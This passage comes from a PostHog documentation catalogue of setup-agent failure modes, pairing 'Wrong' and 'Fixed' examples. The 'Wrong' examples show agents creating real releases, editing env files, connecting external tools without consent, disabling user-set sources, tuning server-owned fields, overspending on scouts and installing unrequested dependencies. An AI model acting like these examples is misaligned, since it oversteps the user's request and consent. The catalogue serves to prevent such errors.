    POSTHOG_CLI_API_KEY: $POSTHOG_CLI_API_KEY
  script:
    - printf "POSTHOG_CLI_API_KEY=$POSTHOG_CLI_API_KEY\n" > .env
    - npm run build
```

**Fixed:**

```yaml
build:
  stage: build
  # PostHog source map upload: this job needs POSTHOG_CLI_API_KEY,
  # POSTHOG_CLI_PROJECT_ID and POSTHOG_CLI_HOST available as CI/CD
  # variables (Settings -> CI/CD -> Variables); GitLab injects them.
  # Mark them Masked, Protected only if this job runs on protected branches.
  script:
    - npm ci
    - npm run build
```

## Release linking edits local dev and creates releases

**Problem.** To 'test' release linking the agent adds release env vars to .env and .env.example and runs posthog-cli locally, not knowing a resolve creates a real release.

**Impact.** A real release is created in the user's PostHog project, and local run scripts and env files change, though local runs should send no release ID.

**Rule location.** [`context-mill: context/agents/error-tracking/link-releases.md`](https://github.com/PostHog/context-mill/blob/main/context/agents/error-tracking/link-releases.md) ('Local development stays as it is')

**Sources.** [PostHog/context-mill#416](https://github.com/PostHog/context-mill/pull/416)

**Frameworks.** `all`

**Wrong:**

```bash
echo "POSTHOG_RELEASE_ID=" >> .env.example
echo "POSTHOG_CLI_API_KEY=" >> .env
posthog-cli release resolve     # run locally "to test": creates a real release
```

**Fixed:**

```text
This is a deploy-time change only. Local runs, tests, pull-request builds, and
previews send no release ID, and that is correct. So do not touch run scripts,
dev servers, test config, `.env`, or `.env.example`. Do not ask for a personal
API key, because nothing local uses one. Never run `posthog-cli` yourself: a
resolve creates a real release in the user's project.
```

## Setup overrides or enables unconfirmed signal sources

**Problem.** Setup agents converge on their target state: seeing @sentry/node or a Jira config reads as permission to connect it, and sources the user set get disabled while tuning.

**Impact.** Deliberate user configuration is silently replaced, and external tools like Sentry, Linear or Zendesk get connected without consent.

**Rule location.**

- [`context-mill: context/skills/self-driving/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/self-driving/description.md) (Ground rules: 'On is the only direction this run moves a source', 'Connected tools are ask-then-connect', 'The write surface is this list')
- references/5-connected-tools.md ('Never enable one the user hasn't confirmed')

**Sources.** [PostHog/context-mill#313](https://github.com/PostHog/context-mill/pull/313), [PostHog/context-mill#374](https://github.com/PostHog/context-mill/pull/374), [PostHog/context-mill#273](https://github.com/PostHog/context-mill/pull/273)

**Frameworks.** `self-driving`

**Wrong:**

```text
# package.json has @sentry/node
inbox-source-configs-create {"source_product": "sentry", "source_type": "issue", "enabled": true}
inbox-source-configs-partial-update enabled:false   # user had it on
scout-config-update { id, emit: false, run_interval_minutes: 15 }
```

**Fixed:**

```text
On is the only direction this run moves a source. An enabled row is someone's
deliberate choice, so it stays.
Connected tools are ask-then-connect: the user's step-5 answer authorizes each one.
Repo hints shape the question; they never stand in for the answer.
Ask once with a wizard_ask multi-select, "None of these" first.
```

## Tunes server-owned fields on scout configs

**Problem.** The update tool exposes many fields, and the agent 'optimizes' intervals, emit and built-in scout bodies while only asked to enable things.

**Impact.** Server-owned defaults and built-in scouts change, shifting the project's posture unintentionally.

**Rule location.**

- [`context-mill: context/skills/self-driving/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/self-driving/description.md) (Ground rules, 'The write surface is this list')
- references/6-scouts.md step 3

**Sources.** [PostHog/context-mill#374](https://github.com/PostHog/context-mill/pull/374), [PostHog/context-mill#370](https://github.com/PostHog/context-mill/pull/370)

**Frameworks.** `self-driving`

**Wrong:**

```text
scout-config-update { id, enabled: true, emit: true, run_interval_minutes: 5 }
// or edits a built-in scout skill body, or calls signals-scout-emit-signal
```

**Fixed:**

```text
The write surface: `enabled` on a source config; `enabled` on a scout config;
new custom scouts only from step 6b (user-approved); scanners only from 6c's locked scaffolds.
scout-config-update { id, enabled: false }   // that one field is the whole update
emit and run_interval_minutes defaults are the intended posture.
```

## Enables too many signals scouts

**Problem.** More scouts looks like more value, so the agent enables every scout with data, including ones that duplicate native error-tracking and replay sources, and never reads the project's run budget. Findings per run drop with no visible error.

**Impact.** Every scout is recurring LLM spend, and the share of runs that produce a finding falls once more than about ten scouts are enabled. The user is never told the budget.

**Rule location.**

- [`context-mill: context/skills/self-driving/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/self-driving/description.md) (Ground rules, 'Keep the scout troop inside one budget of about ten')
- references/6-scouts.md (steps 1b, 1c, 2)
- references/6b-tailor-scouts.md
- references/7-report.md
- `wizard: src/lib/programs/self-driving/prompt.ts` (STEP 6)

**Sources.** [PostHog/context-mill#295](https://github.com/PostHog/context-mill/pull/295), [PostHog/context-mill#274](https://github.com/PostHog/context-mill/pull/274), [PostHog/context-mill#197](https://github.com/PostHog/context-mill/pull/197), [PostHog/wizard#707](https://github.com/PostHog/wizard/pull/707)

**Frameworks.** `self-driving`

**Wrong:**

```text
scout-config-sync -> ~19 scouts
enable all with data, incl. error-tracking and session-replay scouts
+ propose 5 custom scouts -> 24 enabled
# no scout-metadata-get read, nothing about the budget in the report
```

**Fixed:**

```text
general + up to 5 specialists for the most-used products + up to 5 custom, total <= ~10
no error-tracking/replay scouts (routed to native source / scanners)
scout-metadata-get -> max_runs_per_day; if under ~10, shrink to general + one specialist
older deploy (tool missing): size against the ten-scout ceiling, quote 100/day as the published default
budget and per-scout decisions go in the report
```

## Operational scout switched off or forced on

**Problem.** The inbox-validation scout looks like any other specialist, so setup disables it while tuning, then on rerun 'repairs' it with enabled: true, which also clears a pause.

**Impact.** When it is off, report follow-up checks end errored with no reason shown. Forcing it on reverses a user's or failure-breaker's pause without consent.

**Rule location.**

- context-mill (main, local checkout is stale): context/skills/self-driving/references/6-scouts.md ('Operational scouts are not part of the troop', step 3 'Leave a disabled operational scout as it is, and report it')
- description.md (Ground rules)

**Sources.** [PostHog/context-mill#410](https://github.com/PostHog/context-mill/pull/410), [PostHog/context-mill#415](https://github.com/PostHog/context-mill/pull/415)

**Frameworks.** `self-driving`

**Wrong:**

```text
// step 6: disable every scout not in the enabled set
scout-config-update { "id": "<signals-scout-inbox-validation>", "enabled": false }
// rerun: repair it
scout-config-update { "id": "<inbox-validation>", "enabled": true }  // clears paused_by_system
```

**Fixed:**

```text
Rows with scout_role: "operational" are outside the troop (no scout_role: treat
signals-scout-inbox-validation as operational by name).
Never send scout-config-update for them, not even { enabled: true }.
scout-config-sync already resumes harness-made pauses. A row still off:
read status and pause_reason, leave it off, record one follow-up.
```

## Typecheck tooling added the project never had

**Problem.** To verify its edits the agent wants a type check. When the project has none, it installs one next to the SDK, as a production dependency, and does not see it as an unrelated change.

**Impact.** typescript and @astrojs/check land in the user's dependencies on a project that never needed them. This scope creep is silent.

**Rule location.**

- [`context-mill: context/skills/integration-v2/build/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/integration-v2/build/description.md) ('Run the project's build (or typecheck) and lint scripts if they exist')
- [`context-mill: context/skills/integration/references/3-revise.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/integration/references/3-revise.md)
- `wizard: src/lib/agent/runner/harness/pi/runtime-notes.ts` (bash only for commands the project itself defines, verify by reading files if none), src/lib/agent/commandments.ts (minimal targeted edits, integration only adds instrumentation)

**Sources.** [PostHog/wizard#657](https://github.com/PostHog/wizard/issues/657)

**Frameworks.** `astro`, `all`

**Wrong:**

```shell
npm install posthog-js typescript @astrojs/check
npx astro check
# package.json "dependencies": { "astro": "^5.10.2", "typescript": "^5.9.3", "@astrojs/check": "^0.9.0" }
```

**Fixed:**

```shell
# runtime notes: bash is ONLY for install/build/typecheck/lint commands the project defines
# if it defines none, confirm by reading the files
npm run build          # only if package.json has a build script
npm install posthog-js # install only what the integration introduces
```

## Replay vision setup aborts without an SDK

**Problem.** A feature-setup agent finds no PostHog SDK. It either aborts because the precondition failed, or over-corrects into a full integration with identify and capture.

**Impact.** The user who asked for Replay vision gets no recordings and nothing set up, or gets a much bigger change than they asked for.

**Rule location.**

- [`context-mill: context/agents/replay-vision/setup-replay-vision.md`](https://github.com/PostHog/context-mill/blob/main/context/agents/replay-vision/setup-replay-vision.md) (Goal, 'PostHog is not integrated')
- install.md and init.md ('You only exist in this flow...')

**Sources.** [PostHog/context-mill#341](https://github.com/PostHog/context-mill/pull/341), [PostHog/context-mill#343](https://github.com/PostHog/context-mill/pull/343)

**Frameworks.** `all`

**Wrong:**

```text
[ABORT] PostHog is not integrated in this project
```

**Fixed:**

```text
PostHog is not integrated: do not stop, integrate
- install and init, independent of each other
- enable-replay, after install and init
- the three scanner tasks and report, as usual
Never plan an identify, capture, or dashboard task.
```
